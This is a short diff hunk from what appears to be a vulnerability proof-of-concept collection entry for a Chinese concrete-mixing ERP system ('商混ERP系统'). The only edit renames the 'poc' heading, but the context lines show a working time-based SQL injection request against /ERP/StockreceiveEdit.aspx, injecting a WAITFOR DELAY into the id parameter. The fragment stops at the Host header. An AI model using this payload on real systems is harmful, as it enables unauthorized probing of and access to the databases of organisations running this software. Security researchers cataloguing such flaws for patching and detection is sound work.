@@ -7,7 +7,7 @@
 title="商混ERP系统"
 ```
 
-## poc
+## POC
 ```javascript
 GET /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
 Host: 
